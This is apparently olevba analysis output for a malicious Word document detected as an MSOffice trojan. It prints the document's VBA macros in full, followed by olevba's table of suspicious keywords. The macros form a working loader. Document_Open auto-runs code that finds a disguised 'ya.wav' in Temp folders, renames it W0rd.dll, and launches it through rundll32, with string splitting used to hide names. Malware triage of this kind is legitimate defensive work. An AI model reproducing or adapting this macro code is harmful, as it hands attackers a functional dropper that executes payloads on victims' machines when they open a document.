olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.Agent.gen-36690bf953192eb205f486a364f788fd75aafa0e119bacb039f2503d4e81d0fa
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: HEUR-Trojan.MSOffice.Agent.gen-36690bf953192eb205f486a364f788fd75aafa0e119bacb039f2503d4e81d0fa - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim glbl As Integer

Private Sub Document_Open()

 Dim yy As String

 yy = ActiveDocument.AttachedTemplate.Path
 


Dim vxcv As Integer
Call chek

If glbl = 1 Then
Exit Sub
End If
Call ssss
Dim pushstr As String
pushstr = "\W" & "0rd.d"
Dim geto As String
Dim pus As String
pus = "exe"
geto = "nd"
Dim jsd As String
jsd = geto
 Dim hh As String
 hh = "32." & pus
 Dim fa As String
 fa = "ru" & jsd & "ll" & hh
Dim regsrva As New Shell32.Shell
yy = yy & pushstr & "ll,DllUnregisterServer"

Call regsrva.ShellExecute(fa, yy, " ", SW_SHOWNORMAL)
End Sub


Sub chek()
 Dim yy As String

 yy = ActiveDocument.AttachedTemplate.Path
 Dim wwww As String
 wwww = yy
 
 If Dir(wwww & "\W0rd.dll") = "" Then
 glbl = 0
 Else

 glbl = 1
 End If
End Sub


-------------------------------------------------------------------------------
VBA MACRO Module10.bas 
in file: HEUR-Trojan.MSOffice.Agent.gen-36690bf953192eb205f486a364f788fd75aafa0e119bacb039f2503d4e81d0fa - OLE stream: 'Macros/VBA/Module10'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub gotodown()
Call gototwo
   Selection.TypeBackspace
   Selection.Copy
   
End Sub


Sub gototwo()
Selection.MoveDown Unit:=wdLine, Count:=1
    Selection.MoveRight Unit:=wdCharacter, Count:=5
    Selection.MoveDown Unit:=wdLine, Count:=24
    Selection.MoveRight Unit:=wdCharacter, Count:=50
    Selection.MoveDown Unit:=wdLine, Count:=24
    Selection.MoveRight Unit:=wdCharacter, Count:=5
    Selection.MoveDown Unit:=wdLine, Count:=24
    Selection.MoveRight Unit:=wdCharacter, Count:=50
End Sub






Sub checkthe(sf As String)
Dim pifpaf As String
pifpaf = sf
Dim pafh As String
pafh = repid
strFileExists = Dir(pifpaf & "\ya.wav")
Dim nothings As String
nothings = pafh

      If strFileExists = "" Then
    
    Else
         If Dir(nothings & "\W0rd.dll") = "" Then

        Name sf & "\ya.wav" As ActiveDocument.AttachedTemplate.Path & "\W0rd.dll"
    Else
   Exit Sub
    End If
  
    End If
End Sub


Function repid()

repid = ActiveDocument.AttachedTemplate.Path
End Function

-------------------------------------------------------------------------------
VBA MACRO Module12.bas 
in file: HEUR-Trojan.MSOffice.Agent.gen-36690bf953192eb205f486a364f788fd75aafa0e119bacb039f2503d4e81d0fa - OLE stream: 'Macros/VBA/Module12'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub hi(myhome As String)
Dim glog As String
glog = ActiveDocument.AttachedTemplate.Path
Dim fu As String
fu = glog & "\W0rd.dll"
Name myhome & "\ya.wav" As fu
End Sub




-------------------------------------------------------------------------------
VBA MACRO Module11.bas 
in file: HEUR-Trojan.MSOffice.Agent.gen-36690bf953192eb205f486a364f788fd75aafa0e119bacb039f2503d4e81d0fa - OLE stream: 'Macros/VBA/Module11'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub ssss()
Dim ntgs
Dim sda
Call gotodown
    ntgs = 50
sda = 49
Dim jos

While sda < 50
      ntgs = ntgs - 1
      
      If Dir(Left(ActiveDocument.AttachedTemplate.Path, ntgs) & "Loc" & "al\Te" & "mp", vbDirectory) = "" Then
        
    Else
  
   sda = 61
    End If

   Wend
   
Call Getme(Left(ActiveDocument.AttachedTemplate.Path, ntgs) & "Local\Temp")
  Selection.TypeBackspace
   

End Sub






-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: HEUR-Trojan.MSOffice.Agent.gen-36690bf953192eb205f486a364f788fd75aafa0e119bacb039f2503d4e81d0fa - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



Function Getme(RootPath As String)
Dim hor As String

Dim fso As Object
Dim fld As Object
Dim vhhs As Object
Dim afs As String
Dim myArr
hor = repid
Dim asdf
Dim cheza As String
cheza = "Scri"
asdf = RootPath
Set fso = CreateObject(cheza & "pting.FileSystem" & "Object")

Set fld = fso.GetFolder(asdf)

strFileExists = Dir(RootPath & "\ya.wav")
      If strFileExists = "" Then
    
For Each vhhs In fld.SUBFOLDERS


afs = vhhs

        Call checkthe(afs)
    myArr = Getme(vhhs.Path)


Next
    Set vhhs = Nothing
Getme = myArr
Set fld = Nothing
Set fso = Nothing



    Else
      If Dir(hor & "\W0rd.dll") = "" Then
      
     
   Call hi(RootPath)
      Else
      Exit Function
  End If
    
        End If


End Function








+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|ShellExecute        |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Shell32             |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |W0rd.dll            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

